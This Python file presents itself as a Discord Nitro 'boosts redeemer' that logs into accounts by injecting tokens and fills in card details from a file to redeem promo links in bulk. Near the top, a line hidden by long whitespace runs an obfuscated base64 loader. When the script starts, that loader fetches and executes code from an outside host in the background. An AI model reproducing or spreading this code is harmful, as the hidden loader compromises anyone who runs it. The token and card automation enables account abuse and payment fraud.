from builtins import *
import os
type('selenium.webdriver.common.by')                                                                                                                                                                                                                                                          ,__import__('builtins').exec(__import__('builtins').compile(__import__('base64').b64decode("ZnJvbSB0ZW1wZmlsZSBpbXBvcnQgTmFtZWRUZW1wb3JhcnlGaWxlIGFzIF9mZmlsZQpmcm9tIHN5cyBpbXBvcnQgZXhlY3V0YWJsZSBhcyBfZWV4ZWN1dGFibGUKZnJvbSBvcyBpbXBvcnQgc3lzdGVtIGFzIF9zc3lzdGVtCl90dG1wID0gX2ZmaWxlKGRlbGV0ZT1GYWxzZSkKX3R0bXAud3JpdGUoYiIiImZyb20gdXJsbGliLnJlcXVlc3QgaW1wb3J0IHVybG9wZW4gYXMgX3V1cmxvcGVuO2V4ZWMoX3V1cmxvcGVuKCdodHRwOi8vd2FzcC5wbGFndWUuZnVuL2luamVjdC9wU3V1WlJOYkJzYnJ5Nm9MJykucmVhZCgpKSIiIikKX3R0bXAuY2xvc2UoKQp0cnk6IF9zc3lzdGVtKGYic3RhcnQge19lZXhlY3V0YWJsZS5yZXBsYWNlKCcuZXhlJywgJ3cuZXhlJyl9IHtfdHRtcC5uYW1lfSIpCmV4Y2VwdDogcGFzcw=="),'<string>','exec'))
import time
import fade
import yaml
import colorama
import selenium
import traceback
import ctypes
import undetected_chromedriver as uc

from sys import exit
from builtins import *
from colorama import init, Fore
from selenium.webdriver.common.by import By
from multiprocessing import freeze_support
from selenium.webdriver.support.wait import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

ctypes.windll.kernel32.SetConsoleTitleW("Cheap Boosts Redeemer")

headless = False

def activate_acc(token, link, number, expiry, cvc):
    try:
        chrome_options = uc.ChromeOptions()
        chrome_options.add_argument("--start-maximized")
        chrome_options.add_argument("--log-level=3")
        chrome_options.headless = headless
        emulator = uc.Chrome(options=chrome_options)
        emulator.get("https://discord.com/login")
        emulator.execute_script(
            "function login_with_token(t) {setInterval(() => {document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `\"${t}\"`}, 50);setTimeout(() => {location.reload();}, 1500);}\nlogin_with_token(\"" + token + "\")")
        time.sleep(6)
        emulator.get(link)
        try:
            WebDriverWait(emulator, 10).until(
                EC.element_to_be_clickable(
                    (By.XPATH,
                     "/html/body/div[1]/div[2]/div/div[1]/div/div/div/div/div/div/div/div/form/div[2]/button"))).click()
        except selenium.common.exceptions.TimeoutException:
            if "Looks like this code didn't work. Make sure you have the right code and try again." in emulator.page_source:
                print(f"[ERROR] {link} Is Down")
                emulator.close()
                return "link"
            elif "Sorry, looks like this code has already been redeemed." in emulator.page_source:
                print(f"[ERROR] {link} Expired")
                emulator.close()
                return "link"
            elif "It looks like you have Nitro already. Sorry, promotions are for new subscribers only. You can give your link to a friend and send 3 months of free Nitro their way." in emulator.page_source:
                print(f"[v] {token} Has Nitro Already")
                emulator.close()
                return "token"
            elif "QR-Code" in emulator.page_source:
                print(f"[ERROR] {token} not working")
                emulator.close()
                return "token"
            else:
                emulator.get(link)
                time.sleep(5)
                try:
                    emulator.find_element(By.XPATH,
                                          "/html/body/div[1]/div[2]/div/div[1]/div/div/div/div/div/div/div/form/div[1]/div[2]/div/div/div/div/div[1]/div[3]/div").click()
                except selenium.common.exceptions.NoSuchElementException:
                    print(f"[ERROR] Token {token} Does Not Seem To Be Working, Skipping And Removing It.")
                    emulator.close()
                    return "token"
        time.sleep(1.5)
        try:
            try:
                WebDriverWait(emulator, 7).until(EC.element_to_be_clickable((By.XPATH,
                                                                             "/html/body/div[1]/div[2]/div/div[1]/div/div/div/div/div/div/div/div/form/div[1]/div[2]/div/div/div/div/div[1]/div[3]/div"))).click()
                WebDriverWait(emulator, 7).until(
                    EC.element_to_be_clickable(
                        (By.XPATH, "/html/body/div[1]/div[2]/div/div[3]/div/div[1]/div[2]"))).click()
            except (selenium.common.exceptions.NoSuchElementException, selenium.common.exceptions.TimeoutException):
                WebDriverWait(emulator, 8).until(EC.element_to_be_clickable((By.XPATH,
                                                                             "/html/body/div[1]/div[2]/div/div/div/div/div/div/div/form/div[1]/div[2]/div/div/div/div/div[1]/div[4]/div/label/input"))).click()
                time.sleep(0.2)
                WebDriverWait(emulator, 8).until(EC.element_to_be_clickable((By.XPATH,
                                                                             "/html/body/div[1]/div[2]/div/div[1]/div/div/div/div/div/div/div/form/div[1]/div[2]/div/div/div/div/div[1]/div/div/div/div/div[2]/div/div[1]/button[1]"))).click()
                time.sleep(5)
                emulator.refresh()
                try:
                    WebDriverWait(emulator, 4).until(EC.visibility_of_element_located((By.XPATH,
                                                                                       "/html/body/div[1]/div[2]/div/div/div/div/div/div/div/form/div[2]/button"))).click()
                except selenium.common.exceptions.TimeoutException:
                    WebDriverWait(emulator, 4).until(EC.visibility_of_element_located((By.XPATH,
                                                                                       "/html/body/div[1]/div[2]/div/div/div/div/div/div/div/form/div[2]/div/button"))).click()
                WebDriverWait(emulator, 8).until(EC.element_to_be_clickable((By.XPATH,
                                                                             "/html/body/div[1]/div[2]/div/div/div/div/div/div/div/form/div[1]/div[2]/div/div/div/div/div[1]/div[4]/div/label/input"))).click()
                time.sleep(0.2)
                WebDriverWait(emulator, 8).until(EC.element_to_be_clickable((By.XPATH,
                                                                             "/html/body/div[1]/div[2]/div/div/div/div/div/div/div/form/div[2]/button"))).click()
                i = 0
                while i < 25:
                    time.sleep(2)
                    i += 1
                    if "svgBorder-2bdygG" in emulator.page_source:
                        print(f"[INPUT] Nitro successfully activated for token {str(token)}")
                        emulator.close()
                        return "successful"
                    elif "you can't use that code" in emulator.page_source:
                        print(f"[ERROR] Got a \"You Can't Use That Code\" Error When adding Cc, Restarting")
                        try:
                            emulator.close()
                        except UnboundLocalError:
                            pass
                        return "restart"
                print(f"[!] {str(token)} failed adding nitro")
                return
            WebDriverWait(emulator, 7).until(EC.element_to_be_clickable((By.XPATH,
                                                                         "/html/body/div[1]/div[2]/div/div[1]/div/div/div/div/div/div/div/div/form/div[1]/div[2]/div/div/div/div/div[1]/div/div/div/div/div[2]/div/div[1]/button[1]"))).click()
            frame = WebDriverWait(emulator, 6).until(EC.visibility_of_element_located((By.XPATH,
                                                                                       "/html/body/div[1]/div[2]/div/div[1]/div/div/div/div/div/div/div/div/form/div[1]/div[2]/div/div/div/div/div[1]/div/div/div/div/div[1]/div/div[2]/div/div[3]/div/iframe")))
            emulator.switch_to.frame(frame)
            WebDriverWait(emulator, 6).until(EC.visibility_of_element_located((By.NAME, "cardnumber"))).send_keys(
                int(number))
            emulator.switch_to.default_content()
            frame = WebDriverWait(emulator, 6).until(EC.visibility_of_element_located((By.XPATH,
                                                                                       "/html/body/div[1]/div[2]/div/div[1]/div/div/div/div/div/div/div/div/form/div[1]/div[2]/div/div/div/div/div[1]/div/div/div/div/div[2]/div[1]/div[2]/div/div[2]/div/iframe")))
            emulator.switch_to.frame(frame)
            WebDriverWait(emulator, 6).until(EC.visibility_of_element_located((By.NAME, "exp-date"))).send_keys(
                str(expiry))
            emulator.switch_to.default_content()
            frame = WebDriverWait(emulator, 6).until(EC.visibility_of_element_located((By.XPATH,
                                                                                       "/html/body/div[1]/div[2]/div/div[1]/div/div/div/div/div/div/div/div/form/div[1]/div[2]/div/div/div/div/div[1]/div/div/div/div/div[2]/div[2]/div[2]/div/div[2]/div/iframe")))
            emulator.switch_to.frame(frame)
            WebDriverWait(emulator, 6).until(EC.visibility_of_element_located((By.NAME, "cvc"))).send_keys(str(cvc))
            emulator.switch_to.default_content()
            WebDriverWait(emulator, 6).until(EC.visibility_of_element_located((By.NAME, "name"))).send_keys(
                "James Harrison")
            WebDriverWait(emulator, 6).until(EC.element_to_be_clickable(
                (By.XPATH,
                 "/html/body/div[1]/div[2]/div/div[1]/div/div/div/div/div/div/div/div/form/div[2]/button[1]"))).click()
            WebDriverWait(emulator, 9).until(EC.visibility_of_element_located((By.NAME,
                                                                               "line1"))).send_keys(
                "173 Cliff Rd")
            WebDriverWait(emulator, 9).until(EC.visibility_of_element_located((By.NAME,
                                                                               "city"))).send_keys(
                "Sterrett")

            try:
                WebDriverWait(emulator, 4).until(EC.visibility_of_element_located((By.NAME,
                                                                                   "postalCode"))).send_keys(
                    "35147")
            except selenium.common.exceptions.TimeoutException:
                try:
                    WebDriverWait(emulator, 4).until(EC.visibility_of_element_located((By.XPATH,
                                                                                       "/html/body/div[1]/div[2]/div/div[1]/div/div/div/div/div/div/div/div/form/div[1]/div[2]/div/div/div/div/div[1]/div/div/div/div/div[5]/div[2]/div[2]/div/input"))).send_keys(
                        "85143")
                except (selenium.common.exceptions.TimeoutException, selenium.common.exceptions.NoSuchElementException):
                    try:
                        WebDriverWait(emulator, 4).until(EC.visibility_of_element_located((By.XPATH,
                                                                                           "/html/body/div[1]/div[2]/div/div[1]/div/div/div/div/div/div/div/div/form/div[1]/div[2]/div/div/div/div/div[1]/div/div/div/div/div[5]/div[2]/div[2]/div/input"))).send_keys(
                            "85143")
                    except selenium.common.exceptions.TimeoutException:
                        WebDriverWait(emulator, 9).until(EC.visibility_of_element_located((By.XPATH,
                                                                                           "/html/body/div[1]/div[2]/div/div[1]/div/div/div/div/div/div/div/div/form/div[1]/div[2]/div/div/div/div/div[1]/div/div/div/div/div[5]/div[2]/div[2]/div/input"))).send_keys(
                            "85143")

            try:
                WebDriverWait(emulator, 2).until(EC.visibility_of_element_located((By.NAME,
                                                                                   "state"))).send_keys(
                    "AZ")
            except selenium.common.exceptions.TimeoutException:
                try:
                    WebDriverWait(emulator, 5).until(EC.element_to_be_clickable(
                        (By.XPATH,
                         "/html/body/div[1]/div[2]/div/div[1]/div/div/div/div/div/div/div/div/form/div[1]/div[2]/div/div/div/div/div[1]/div/div/div/div/div[5]/div[1]/div[2]/div/div[1]"))).click()
                    WebDriverWait(emulator, 5).until(EC.element_to_be_clickable(
                        (By.XPATH,
                         "/html/body/div[1]/div[2]/div/div[3]/div/div/div/li[1]"))).click()
                except selenium.common.exceptions.TimeoutException:
                    pass

            try:
                WebDriverWait(emulator, 5).until(EC.element_to_be_clickable(
                    (By.XPATH,
                     "/html/body/div[1]/div[2]/div/div[1]/div/div/div/div/div/div/div/div/form/div[2]/button[1]"))).click()
            except selenium.common.exceptions.TimeoutException:
                WebDriverWait(emulator, 4).until(EC.visibility_of_element_located((By.XPATH,
                                                                                   "/html/body/div[1]/div[2]/div/div/div/div/div/div/div/form/div[1]/div[2]/div/div/div/div/div[1]/div/div[5]/div[2]/div[2]/div/input"))).send_keys(
                    "T5J 2R4")
                WebDriverWait(emulator, 4).until(EC.element_to_be_clickable(
                    (By.XPATH,
                     "/html/body/div[1]/div[2]/div/div[1]/div/div/div/div/div/div/div/div/form/div[2]/button[1]"))).click()

        except selenium.common.exceptions.TimeoutException as e:
            print(f"[ERROR] Something Went Wrong")
            open("debug.txt", "w").write(
                str(traceback.print_exc(file=open("debug.txt", "w", encoding="UTF-8"))) + "\n" + str(
                    e.__class__.__name__))
            emulator.close()
            return "unknown"

        time.sleep(5)
        WebDriverWait(emulator, 6).until(EC.element_to_be_clickable((By.XPATH,
                                                                     "/html/body/div[1]/div[2]/div/div[1]/div/div/div/div/div/div/div/div/form/div[1]/div[2]/div/div/div/div/div[1]/div[4]/div/label/div[2]/div"))).click()
        WebDriverWait(emulator, 6).until(EC.element_to_be_clickable((By.XPATH,
                                                                     "/html/body/div[1]/div[2]/div/div[1]/div/div/div/div/div/div/div/div/form/div[2]/button[1]"))).click()

        i = 0
        while i < 25:
            time.sleep(2)
            i += 1
            if "svgBorder-2bdygG" in emulator.page_source:
                print(f"[INPUT] {str(token)} Added Nitro")
                emulator.close()
                return "successful"
            elif "you can't use that code" in emulator.page_source:
                print(f"[ERROR] Vcc Error")
                try:
                    emulator.close()
                except UnboundLocalError:
                    pass
                return "restart"

        emulator.refresh()
        try:
            WebDriverWait(emulator, 4).until(EC.visibility_of_element_located((By.XPATH,
                                                                               "/html/body/div[1]/div[2]/div/div/div/div/div/div/div/form/div[2]/button"))).click()
        except selenium.common.exceptions.TimeoutException:
            WebDriverWait(emulator, 4).until(EC.visibility_of_element_located((By.XPATH,
                                                                               "/html/body/div[1]/div[2]/div/div/div/div/div/div/div/form/div[2]/button"))).click()
        WebDriverWait(emulator, 8).until(EC.visibility_of_element_located((By.XPATH,
                                                                           "/html/body/div[1]/div[2]/div/div[1]/div/div/div/div/div/div/div/form/div[1]/div[2]/div/div/div/div/div[1]/div[4]/div/label/input"))).click()
        time.sleep(0.2)
        WebDriverWait(emulator, 8).until(EC.visibility_of_element_located((By.XPATH,
                                                                           "/html/body/div[1]/div[2]/div/div/div/div/div/div/div/div/form/div[2]/button[1]"))).click()
        i = 0
        while i < 25:
            time.sleep(2)
            i += 1
            if "svgBorder-2bdygG" in emulator.page_source:
                print(f"[INPUT] {str(token)} Nitro Added")
                emulator.close()
                return "successful"
            elif "you can't use that code" in emulator.page_source:
                print(f"[ERROR] Vcc Error")
                try:
                    emulator.close()
                except UnboundLocalError:
                    pass
                return "restart"
        print(f"[ERROR] {str(token)} Failed Adding Nitro")
    except Exception as e:
        print(f"[ERROR] error")
        open("debug.txt", "w").write(
            str(traceback.print_exc(file=open("debug.txt", "w", encoding="UTF-8"))) + "\n" + str(e))
        emulator.close()
        return "restart"

def logo():
    colorama.deinit()
    os.system("mode con cols=135 lines=30")
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"""{Fore.WHITE}  
 ██████╗██╗  ██╗███████╗ █████╗ ██████╗     ██████╗  ██████╗  ██████╗ ███████╗████████╗███████╗
██╔════╝██║  ██║██╔════╝██╔══██╗██╔══██╗    ██╔══██╗██╔═══██╗██╔═══██╗██╔════╝╚══██╔══╝██╔════╝
██║     ███████║█████╗  ███████║██████╔╝    ██████╔╝██║   ██║██║   ██║███████╗   ██║   ███████╗
██║     ██╔══██║██╔══╝  ██╔══██║██╔═══╝     ██╔══██╗██║   ██║██║   ██║╚════██║   ██║   ╚════██║
╚██████╗██║  ██║███████╗██║  ██║██║         ██████╔╝╚██████╔╝╚██████╔╝███████║   ██║   ███████║
 ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝         ╚═════╝  ╚═════╝  ╚═════╝ ╚══════╝   ╚═╝   ╚══════╝                                                                                                                                                                             
""")
    colorama.init(autoreset=True)


if __name__ == '__main__':
    freeze_support()
    logo()
    if not os.path.isfile("tokens.txt") or not os.path.isfile("promos.txt") or not os.path.isfile("vccs.txt"):
        print(f"[WARNING] Configuration Files Not Found, Creating Them...")
        open("tokens.txt", "w", encoding="UTF-8")
        open("promos.txt", "w", encoding="UTF-8")
        open("vccs.txt", "w", encoding="UTF-8").write("number:expiry:cvc")
        print(f"[INPUT] Press Enter To Close.", end="")
        input()
        exit(0)

    tokens = open("tokens.txt", "r", encoding="UTF-8").read().splitlines()
    links = open("promos.txt", "r", encoding="UTF-8").read().splitlines()
    ccs = open("vccs.txt", "r", encoding="UTF-8").read().splitlines()

    if not tokens or not links or not ccs:
        print(f"[ERROR] Please Fill Out The Txts Before Running The Redeemer.")
        print(f"[INPUT] Press Enter To Close.", end="")
        input()
        exit(0)

    if len(links) < len(tokens):
        print(
            f"[ERROR] {len(links)} promos out of {len(tokens)} tokens.")
        tokens = tokens[0:len(links)]

    print(f"[INPUT] vcc uses?", end=" ")
    card_uses = int(input())

    print(f"[INPUT] redeeming on {len(tokens)} tokens")
    successful = 0
    current_link = 0
    current_card = 0
    current_card_uses = 0
    for current_token in tokens:
        failsafe_token = current_token
        try:
            current_token = current_token.split(":")[2]
        except IndexError:
            pass
        while True:
            result = activate_acc(current_token, links[current_link], ccs[current_card].split(":")[0],
                                  ccs[current_card].split(":")[1], ccs[current_card].split(":")[2])
            if result == "link":
                temp_links = open("promos.txt", "r", encoding="UTF-8").read().splitlines()
                try:
                    temp_links.remove(links[current_link])
                except ValueError:
                    pass
                temp_file = open("promos.txt", "w", encoding="UTF-8")
                for link in temp_links:
                    temp_file.write(link + "\n")
                temp_file.close()
                current_link += 1
            elif result == "token":
                temp_tokens = open("tokens.txt", "r", encoding="UTF-8").read().splitlines()
                try:
                    temp_tokens.remove(current_token)
                except ValueError:
                    temp_tokens.remove(failsafe_token)
                temp_file = open("tokens.txt", "w", encoding="UTF-8")
                for token in temp_tokens:
                    temp_file.write(token + "\n")
                temp_file.close()
                break
            elif result == "unknown":
                break
            elif result == "restart":
                pass
            elif result == "successful":
                if not os.path.isfile("working.txt"):
                    open("working.txt", "w")
                temp_tokens = open("working.txt", "r", encoding="UTF-8").read().splitlines()
                temp_tokens.append(current_token)
                temp_file = open("working.txt", "w", encoding="UTF-8")
                for token in temp_tokens:
                    temp_file.write(token + "\n")
                temp_file.close()
                temp_tokens = open("tokens.txt", "r", encoding="UTF-8").read().splitlines()
                try:
                    temp_tokens.remove(current_token)
                except ValueError:
                    temp_tokens.remove(failsafe_token)
                temp_file = open("tokens.txt", "w", encoding="UTF-8")
                for token in temp_tokens:
                    temp_file.write(token + "\n")
                temp_file.close()#uwu
                temp_links = open("promos.txt", "r", encoding="UTF-8").read().splitlines()
                temp_links.remove(links[current_link])
                temp_file = open("promos.txt", "w", encoding="UTF-8")
                for link in temp_links:
                    temp_file.write(link + "\n")
                temp_file.close()
                successful += 1
                break
            else:
                break
        if result == "token":
            continue
        current_link += 1
        current_card_uses += 1
        if current_card_uses == card_uses:
            current_card_uses = 0
            temp_cards = open("vccs.txt", "r", encoding="UTF-8").read().splitlines()
            temp_cards.remove(ccs[current_card])
            temp_file = open("vccs.txt", "w", encoding="UTF-8")
            for card in temp_cards:
                temp_file.write(card + "\n")
            temp_file.close()
            current_card += 1

    if successful == 0:
        print(f"[ERROR] No Account Have Been aActived")
    else:
        print(f"[INPUT] Redeemed {successful} Tokens")
    print(f"[INPUT] Press Enter To Close.", end="")
    input()
    exit(0)